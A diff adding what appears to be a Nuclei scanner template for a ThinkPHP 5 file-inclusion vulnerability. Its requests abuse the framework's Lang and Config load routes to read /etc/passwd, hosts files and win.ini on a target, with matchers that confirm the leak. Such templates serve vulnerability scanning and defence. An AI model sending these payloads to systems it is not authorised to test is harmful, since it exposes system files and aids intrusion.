@@ -1,0 +1,29 @@
+id: thinkphp5-file-include
+
+info:
+  name: ThinkPHP 5 文件包含
+  author: venom
+  severity: critical
+  description: ThinkPHP 5 文件包含
+  tags: thinkphp
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?s=index/\\think\\Lang/load&file=/etc/passwd"
+      - "{{BaseURL}}?s=index/\\think\\Config/load&file=/etc/passwd"
+      - "{{BaseURL}}?s=index/\\think\\Lang/load&file=C:\\windows\\win.ini"
+      - "{{BaseURL}}?s=index/\\think\\Config/load&file=C:\\windows\\win.ini"
+      - "{{BaseURL}}?s=index/\\think\\Lang/load&file=/etc/hosts"
+      - "{{BaseURL}}?s=index/\\think\\Config/load&file=/etc/hosts"
+      - "{{BaseURL}}?s=index/\\think\\Lang/load&file=C:\\Windows\\System32\\drivers\\etc\\hosts"
+      - "{{BaseURL}}?s=index/\\think\\Config/load&file=C:\\Windows\\System32\\drivers\\etc\\hosts"
+      - "{{BaseURL}}?s=index/\\think\\Lang/load&file=C:\\Windows\\System32\\drivers\\etc\\services"
+      - "{{BaseURL}}?s=index/\\think\\Config/load&file=C:\\Windows\\System32\\drivers\\etc\\services"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'len(body)>=5'
+          - 'contains(body,"[mci extensions]")||contains(body,"Microsoft Corp.")||contains(body,"sbin/nologin")||contains(body,"The following lines")||contains(body,"127.0.0.1")||contains(body,"::1")||contains(body,"127.0.0.1")||contains(body,"::1")'
+        condition: and
